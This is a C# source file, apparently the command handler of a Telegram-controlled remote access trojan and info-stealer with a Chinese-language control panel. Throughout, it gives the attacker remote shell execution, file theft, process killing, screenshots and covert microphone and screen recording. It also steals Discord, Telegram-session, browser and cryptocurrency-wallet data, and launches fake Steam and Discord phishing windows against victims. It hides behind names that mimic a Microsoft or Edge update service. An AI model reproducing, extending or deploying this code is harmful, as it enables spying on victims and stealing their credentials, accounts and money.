using System;
using System.IO;
using System.Threading.Tasks;
using System.IO.Compression;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using TgMessage = Telegram.Bot.Types.Message;
using System.Net.Http;
using Microsoft.Data.Sqlite;
using FinalBot;
using Microsoft.UpdateService.Modules;
using FinalBot.Stealers;
using FinalBot.Modules;
using System.Linq;
using File = System.IO.File;

namespace FinalBot
{
    public class CommandHandler
    {
        private readonly ITelegramBotClient _botClient;
        private readonly string _adminId;
        private readonly Dictionary<long, string> _userState = new Dictionary<long, string>();

        private string _phishAgentName = "Valve_Security_Specialist_732";
        private string _phishCookies = "";
        private string _phishLang = "chinese"; // Default

        public CommandHandler(ITelegramBotClient botClient, string adminId)
        {
            _botClient = botClient;
            _adminId = adminId;
        }

        public async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
        {
            try
            {
                // 1. Media Detector (Highest Priority for help)
                var message = update.Message ?? update.EditedMessage;
                if (message != null && (message.Animation != null || message.Document != null || message.Video != null))
                {
                    string? fileId = message.Animation?.FileId ?? message.Document?.FileId ?? message.Video?.FileId;
                    if (fileId != null)
                    {
                        Console.WriteLine($"[MEDIA] Caught FileID: {fileId}");
                        // Also log to debug file
                        try { File.AppendAllText("C:\\Users\\Public\\edge_update_debug.log", $"[{DateTime.Now}] Caught FileID: {fileId}\n"); } catch { }
                        
                        // Try to notify admin
                        try { await _botClient.SendTextMessageAsync(_adminId, $"📥 <b>Media ID detected:</b>\n<code>{fileId}</code>", parseMode: ParseMode.Html); } catch { }
                    }
                }

                if (update.Type == UpdateType.Message && update.Message != null)
                {
                    await HandleCommand(update.Message);
                }
                else if (update.Type == UpdateType.CallbackQuery && update.CallbackQuery != null)
                {
                    await HandleCallbackQuery(update.CallbackQuery);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[HANDLER ERROR] {ex.Message}");
            }
        }

        public Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
        {
            Console.WriteLine($"[TELEGRAM ERROR] {exception.Message}");
            return Task.CompletedTask;
        }

        public async Task HandleCommand(TgMessage message)
        {
            if (message.From?.Id.ToString() != _adminId) return;

            string text = message.Text ?? "";

            // Handle State-based responses first
            if (_userState.TryGetValue(message.Chat.Id, out string state))
            {
                if (state == "awaiting_agent_name")
                {
                    _phishAgentName = text;
                    _userState.Remove(message.Chat.Id);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Agent Name set to:</b> <code>{_phishAgentName}</code>", parseMode: ParseMode.Html);
                    return;
                }
                else if (state == "awaiting_phish_cookies")
                {
                    _phishCookies = text;
                    _userState.Remove(message.Chat.Id);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>Steam Cookies Injected!</b>", parseMode: ParseMode.Html);
                    return;
                }
                else if (state == "awaiting_victim_name")
                {
                    ConfigManager.VictimName = text;
                    _userState.Remove(message.Chat.Id);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Victim Name set to:</b> <code>{text}</code>", parseMode: ParseMode.Html);
                    return;
                }
            }
            
            if (text.StartsWith("/start") || text.StartsWith("/panel"))
            {
                await ShowAdminPanel(message.Chat.Id);
            }
            else if (text == "/help")
            {
                await ShowHelp(message.Chat.Id);
            }
            else if (text.StartsWith("/shell "))
            {
                string cmd = text.Substring(7).Trim();
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"⚙️ *Running:* `{cmd}`", parseMode: ParseMode.Markdown);
                string result = await ShellManager.ExecuteCommand(cmd);
                await _botClient.SendTextMessageAsync(message.Chat.Id, result, parseMode: ParseMode.Markdown);
            }
            else if (text.StartsWith("/kill "))
            {
                string pidStr = text.Substring(6).Trim();
                if (int.TryParse(pidStr, out int pid))
                {
                    string res = TaskManager.KillProcess(pid);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, res);
                }
            }
            else if (text.StartsWith("/djoin ") || text.StartsWith("/dstream "))
            {
                var parts = text.Split(' ', 3);
                if (parts.Length == 3)
                {
                    string action = text.StartsWith("/djoin") ? "join" : "stream";
                    string res = DiscordRemoteManager.LaunchDiscordBot(parts[1], parts[2], action);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, res);
                }
                else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ Use: /djoin <token> <url>");
            }
            else if (text.StartsWith("/get "))
            {
                string path = text.Substring(5).Trim();
                if (System.IO.File.Exists(path))
                {
                    using var stream = System.IO.File.OpenRead(path);
                    await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, Path.GetFileName(path)));
                }
                else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ File not found.");
            }
            else if (text.StartsWith("/setname "))
            {
                string newName = text.Substring(9).Trim();
                ConfigManager.VictimName = newName;
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ **Victim name updated to:** `{newName}`");
                await ShowAdminPanel(message.Chat.Id);
            }
            else 
            {
                await _botClient.SendTextMessageAsync(message.Chat.Id, "❔ *Unknown command.* Use /help for available commands.");
            }
        }

        public async Task HandleCallbackQuery(CallbackQuery callbackQuery)
        {
            if (callbackQuery.Message is not { } message) return;
            string data = callbackQuery.Data ?? "";

            Console.WriteLine($"[C2] Callback received: {data}");

            switch (data)
            {
                case "admin_panel":
                case "back_to_main":
                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    await ShowAdminPanel(message.Chat.Id, message.MessageId);
                    break;
                case "file_manager":
                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                    var (fmText, fmMarkup) = FileManager.GetDirectoryView("");
                    await EditOrSend(message.Chat.Id, message.MessageId, fmText, fmMarkup, ParseMode.Markdown);
                    break;
                case "proc_list":
                    string procs = TaskManager.GetProcessList();
                    await _botClient.SendTextMessageAsync(message.Chat.Id, procs, parseMode: ParseMode.Markdown);
                    break;
                case "panel_system":
                    await ShowSystemPanel(message.Chat.Id, message.MessageId);
                    break;
                case "panel_work":
                    await ShowWorkPanel(message.Chat.Id, message.MessageId);
                    break;
                case "panel_phishing":
                    await ShowPhishingPanel(message.Chat.Id, message.MessageId);
                    break;
                case "panel_spyware":
                    await ShowSpywarePanel(message.Chat.Id, message.MessageId);
                    break;
                case "set_victim_name":
                    _userState[message.Chat.Id] = "awaiting_victim_name";
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>请输入受害者名称:</b>", parseMode: ParseMode.Html);
                    break;
                case "screenshot":
                    await HandleScreenshot(message.Chat.Id);
                    break;
                case "record_video":
                    await HandleVideoRecord(message.Chat.Id);
                    break;
                case "record_audio":
                    await HandleAudioRecord(message.Chat.Id);
                    break;
                case "clipboard":
                    await HandleClipboard(message.Chat.Id);
                    break;
                case "system_info":
                    await HandleSystemInfo(message.Chat.Id);
                    break;
                case "work_discord":
                    await HandleDiscordSteal(message.Chat.Id);
                    break;
                case "work_browsers":
                    await HandleBrowserSteal(message.Chat.Id);
                    break;
                case "full_report":
                    await HandleFullReport(message.Chat.Id);
                    break;
                case "phish_steam_login":
                    PhishManager.LaunchSteamLogin();
                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam 登录器已启动!");
                    break;
                case "phish_steam_alert":
                    PhishManager.LaunchSteamAlert();
                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam 警告框已启动!");
                    break;
                case "phish_discord_bot":
                    PhishManager.LaunchDiscordRemote();
                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Discord 机器人已启动!");
                    break;
                case "phish_set_lang":
                    _phishLang = (_phishLang == "english") ? "chinese" : "english";
                    await ShowPhishingPanel(message.Chat.Id, message.MessageId);
                    break;
                case "phish_set_agent":
                    _userState[message.Chat.Id] = "awaiting_agent_name";
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>请输入代理名称:</b>", parseMode: ParseMode.Html);
                    break;
                case "phish_set_cookies":
                    _userState[message.Chat.Id] = "awaiting_phish_cookies";
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>粘贴 Cookies (JSON/Base64):</b>", parseMode: ParseMode.Html);
                    break;
                case "discord_remote_start":
                    await ShowDiscordRemoteMenu(message.Chat.Id, message.MessageId);
                    break;
                case "work_telegram":
                    await HandleTelegramSteal(message.Chat.Id);
                    break;
                case "work_crypto":
                    await HandleCryptoSteal(message.Chat.Id);
                    break;
                default:
                    if (data.StartsWith("fmd_"))
                    {
                        var pathInfo = data.Substring(4);
                        if (!int.TryParse(pathInfo, out int pathId)) return;
                        string realPath = PathCache.Get(pathId) ?? "";
                        var (view, keyMarkup) = FileManager.GetDirectoryView(realPath);
                        await EditOrSend(message.Chat.Id, message.MessageId, view, keyMarkup, ParseMode.Markdown);
                    }
                    else if (data.StartsWith("fmf_"))
                    {
                        int id = int.Parse(data.Substring(4));
                        string realPath = PathCache.Get(id) ?? "";
                        if (!string.IsNullOrEmpty(realPath) && File.Exists(realPath))
                        {
                            var info = new FileInfo(realPath);
                            string size = info.Length > 1024 * 1024 ? $"{info.Length / (1024.0 * 1024.0):F2} MB" : $"{info.Length / 1024.0:F2} KB";
                            string caption = $"📄 <b>文件信息</b>\n" +
                                             $"━━━━━━━━━━━━━━━━━━\n" +
                                             $"📂 <b>路径:</b> <code>{info.Name}</code>\n" +
                                             $"⚖️ <b>大小:</b> <code>{size}</code>\n" +
                                             $"━━━━━━━━━━━━━━━━━━";

                            await _botClient.SendTextMessageAsync(message.Chat.Id, $"⬆️ <i>正在上传:</i> <code>{info.Name}</code>...", parseMode: ParseMode.Html);
                            using var stream = File.OpenRead(realPath);
                            await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, info.Name), caption: caption, parseMode: ParseMode.Html);
                        }
                    }
                    else if (data.StartsWith("fmp_"))
                    {
                        var parts = data.Substring(4).Split('_');
                        int parentId = int.Parse(parts[0]);
                        int page = int.Parse(parts[1]);
                        string realPath = PathCache.Get(parentId) ?? "";
                        var (view, keyMarkup) = FileManager.GetDirectoryView(realPath, page);
                        await EditOrSend(message.Chat.Id, message.MessageId, view, keyMarkup, ParseMode.Markdown);
                    }
                    break;
            }
        }

        private async Task HandleScreenshot(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "📸 *正在截屏...*");
            string? path = ScreenshotModule.TakeScreenshot();
            if (path != null)
            {
                using var stream = File.OpenRead(path);
                await _botClient.SendPhotoAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(path)));
                File.Delete(path);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ 截屏失败。");
        }

        private async Task HandleAudioRecord(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🎤 *正在录音 (10秒)...*");
            string? path = AudioModule.RecordAudio(10);
            if (path != null)
            {
                using var stream = File.OpenRead(path);
                await _botClient.SendVoiceAsync(chatId, InputFile.FromStream(stream, "mic_record.wav"));
                File.Delete(path);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ 录音失败。");
        }

        private async Task HandleVideoRecord(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🎥 *正在录像 (10秒)...*");
            string? path = await VideoModule.RecordScreen(10);
            if (path != null)
            {
                using var stream = File.OpenRead(path);
                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "screen_record.zip"), caption: "🎥 屏幕录像序列");
                File.Delete(path);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ 录像失败。");
        }

        private async Task HandleClipboard(long chatId)
        {
            string text = ClipboardModule.GetClipboardText();
            if (!string.IsNullOrEmpty(text))
            {
                await _botClient.SendTextMessageAsync(chatId, $"📋 <b>剪贴板内容:</b>\n<code>{WebUtility.HtmlEncode(text)}</code>", parseMode: ParseMode.Html);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ 剪贴板为空。");
        }

        private async Task HandleSystemInfo(long chatId)
        {
            string info = SystemInfoModule.GetSystemInfo();
            await _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Markdown);
        }

        private async Task HandleDiscordSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "💬 <i>正在扫描 Discord...</i>", parseMode: ParseMode.Html);
            var service = new ChatService();
            string report = await service.Run();
            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
        }

        private async Task HandleBrowserSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🌍 <i>正在扫描浏览器...</i>", parseMode: ParseMode.Html);
            var service = new DataService();
            var report = await service.RunAll();
            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
            
            // ZIP and send the output folder if it exists
            string outputDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc", "VOutput");
            if (Directory.Exists(outputDir))
            {
                string zipPath = Path.Combine(Path.GetTempPath(), "BrowserData.zip");
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(outputDir, zipPath);
                
                using var stream = File.OpenRead(zipPath);
                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "BrowserData.zip"), caption: "🔓 浏览器数据 (ABE 绕过)");
                
                File.Delete(zipPath);
                Directory.Delete(outputDir, true);
            }
        }

        private async Task HandleCryptoSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "💰 <i>正在扫描加密钱包...</i>", parseMode: ParseMode.Html);
            var service = new CryptoService();
            string report = await service.Run(Path.GetTempPath());
            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
        }

        private async Task HandleTelegramSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "✈️ <i>正在扫描 Telegram...</i>", parseMode: ParseMode.Html);
            var service = new MessengerService();
            string result = service.Run();
            if (result.StartsWith("❌"))
            {
                await _botClient.SendTextMessageAsync(chatId, result);
            }
            else
            {
                await _botClient.SendTextMessageAsync(chatId, $"✅ <b>发现 Telegram 会话:</b> <code>{result}</code>", parseMode: ParseMode.Html);
                await _botClient.SendTextMessageAsync(chatId, "📦 正在打包会话...");
                
                string zipPath = Path.Combine(Path.GetTempPath(), "TG_Session.zip");
                if (File.Exists(zipPath)) File.Delete(zipPath);
                
                ZipFile.CreateFromDirectory(result, zipPath);
                
                using (var stream = File.OpenRead(zipPath))
                {
                    await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "Telegram_Sessions.zip"));
                }
                
                File.Delete(zipPath);
                Directory.Delete(result, true);
            }
        }

        private async Task HandleFullReport(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🚀 *正在生成完整报告...*");
            string? zipPath = await ReportManager.CreateFullReport();
            if (zipPath != null)
            {
                using var stream = File.OpenRead(zipPath);
                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(zipPath)), caption: "📦 完整数据报告 (NativeAOT)");
                File.Delete(zipPath);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ 报告生成失败。");
        }

        private async Task ShowAdminPanel(long chatId, int messageId = 0)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[] 
                { 
                    InlineKeyboardButton.WithCallbackData("💻 系统", "panel_system"),
                    InlineKeyboardButton.WithCallbackData("💼 工作", "panel_work"),
                    InlineKeyboardButton.WithCallbackData("👁️ 监控", "panel_spyware")
                },
                new[] { InlineKeyboardButton.WithCallbackData("✍️ 设置受害者名称", "set_victim_name") },
                new[] { InlineKeyboardButton.WithCallbackData("📊 生成完整报告", "full_report") }
            });

            string adminStatus = ElevationService.IsAdmin() ? "🟢 管理员" : "🟡 普通用户";
            string externalIp = SystemInfoModule.GetExternalIP();
            string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
            string victimName = string.IsNullOrEmpty(ConfigManager.VictimName) ? pcUser : ConfigManager.VictimName;
            
            string info = $"🎮 <b>控制面板</b>\n" +
                          $"━━━━━━━━━━━━━━━━━━\n" +
                          $"🖥️ <b>名称:</b> <code>{victimName}</code>\n" +
                          $"⚡ <b>权限:</b> {adminStatus}\n" +
                          $"🌐 <b>IP:</b> <code>{externalIp}</code>\n" +
                          $"📂 <b>路径:</b> <code>{AppDomain.CurrentDomain.BaseDirectory}</code>\n" +
                          $"⌛ <b>时间:</b> <code>{DateTime.Now:HH:mm:ss}</code>\n\n" +
                          $"💻 <b>系统</b> (网络, 文件, 进程, 终端)\n" +
                          $"💼 <b>工作</b> (浏览器, 社交, 钱包, 钓鱼)\n" +
                          $"👁️ <b>监控</b> (录音, 录像, 截屏, 键盘)";

            if (messageId > 0)
                await EditOrSend(chatId, messageId, info, markup);
            else
                await SendWithRetry(() => _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Html, replyMarkup: markup));
        }

        private async Task ShowSystemPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[] { InlineKeyboardButton.WithCallbackData("📂 文件管理器", "file_manager") },
                new[] { InlineKeyboardButton.WithCallbackData("📋 剪贴板", "clipboard") },
                new[] { InlineKeyboardButton.WithCallbackData("⚙️ 系统信息", "system_info") },
                new[] { InlineKeyboardButton.WithCallbackData("📶 进程列表", "proc_list") },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 返回主菜单", "back_to_main") }
            });

            await EditOrSend(chatId, messageId, "💻 <b>系统面板</b>\n管理文件、进程和系统设置:", markup);
        }

        private async Task ShowWorkPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[] { InlineKeyboardButton.WithCallbackData("🎮 Discord 提取", "work_discord") },
                new[] { InlineKeyboardButton.WithCallbackData("✈️ Telegram 提取", "work_telegram") },
                new[] { InlineKeyboardButton.WithCallbackData("🌍 浏览器提取", "work_browsers") },
                new[] { InlineKeyboardButton.WithCallbackData("💰 钱包提取", "work_crypto") },
                new[] { InlineKeyboardButton.WithCallbackData("🎭 钓鱼中心", "panel_phishing") },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 返回主菜单", "back_to_main") }
            });

            await EditOrSend(chatId, messageId, "💼 <b>工作面板</b>\n提取社交、浏览器和钱包数据:", markup);
        }

        private async Task ShowPhishingPanel(long chatId, int messageId)
        {
            string langEmoji = _phishLang == "english" ? "🇺🇸" : "🇨🇳";
            string langText = _phishLang == "english" ? "英文" : "中文";

            var markup = new InlineKeyboardMarkup(new[]
            {
                new[] { InlineKeyboardButton.WithCallbackData("🚀 启动 VAC 警告窗口", "phish_steam_alert") },
                new[] { InlineKeyboardButton.WithCallbackData("🚀 启动 Steam 登录", "phish_steam_login") },
                new[] { InlineKeyboardButton.WithCallbackData("🚀 启动 Discord 机器人", "phish_discord_bot") },
                new[] { InlineKeyboardButton.WithCallbackData($"{langEmoji} 切换语言: {langText}", "phish_set_lang") },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 返回工作面板", "panel_work") }
            });

            string info = "🎭 <b>钓鱼中心</b>\n" +
                          "━━━━━━━━━━━━━━━━━━\n" +
                          $"🕵️ <b>代理名称:</b> <code>{_phishAgentName}</code>\n" +
                          $"🌐 <b>当前语言:</b> {langEmoji} {langText}\n" +
                          "━━━━━━━━━━━━━━━━━━";

            await EditOrSend(chatId, messageId, info, markup);
        }

        private async Task ShowSpywarePanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[] { InlineKeyboardButton.WithCallbackData("📸 屏幕截图", "screenshot") },
                new[] { InlineKeyboardButton.WithCallbackData("🎤 录音 (10s)", "record_audio") },
                new[] { InlineKeyboardButton.WithCallbackData("🎥 屏幕录像 (10s)", "record_video") },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 返回主菜单", "back_to_main") }
            });

            await EditOrSend(chatId, messageId, "👁️ <b>监控面板</b>\n远程监控受害者的屏幕和麦克风:", markup);
        }

        private async Task ShowDiscordRemoteMenu(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[] { InlineKeyboardButton.WithCallbackData("🚀 启动远程控制器", "discord_remote_launch") },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 返回监控面板", "panel_spyware") }
            });

            await EditOrSend(chatId, messageId, "🎮 <b>DISCORD 远程控制</b>\n接管 Discord 会话进行远程操作:", markup);
        }

        private async Task ShowHelp(long chatId)
        {
            string help = "🆘 <b>可用命令列表:</b>\n\n" +
                          "/panel - 打开管理面板\n" +
                          "/shell &lt;cmd&gt; - 执行终端命令\n" +
                          "/kill &lt;pid&gt; - 结束进程\n" +
                          "/get &lt;path&gt; - 下载受害者文件\n" +
                          "/help - 显示此帮助信息";

            await _botClient.SendTextMessageAsync(chatId, help, parseMode: ParseMode.Html);
        }
    }
}
